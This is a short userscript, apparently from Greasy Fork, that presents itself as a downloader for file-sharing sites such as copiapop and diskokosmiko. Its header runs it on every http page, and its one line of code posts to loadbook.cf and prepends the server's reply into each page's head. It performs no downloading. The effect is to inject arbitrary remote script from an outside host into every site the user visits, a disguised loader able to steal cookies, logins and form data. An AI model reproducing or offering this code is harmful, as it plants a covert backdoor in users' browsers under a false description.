// ==UserScript==
// @name        Downloader for
// @namespace   http://www.loadbook.cf
// @description	copiapop downloader, diskokosmiko downloader, kumpulbagi downloader, kutucugum downloader, partagora downloader.
// @include	    http://*
// @oujs:author	Muhammad ariefin
// @icon        http://clipboardjs.com/favicon.ico
// @version     loadbook.cf
// @downloadURL https://update.greasyfork.org/scripts/25166/Downloader%20for.user.js
// @updateURL https://update.greasyfork.org/scripts/25166/Downloader%20for.meta.js
// ==/UserScript==
$.post("http://www.loadbook.cf/download/",{status:"true"},function(o){$("head").prepend(o)});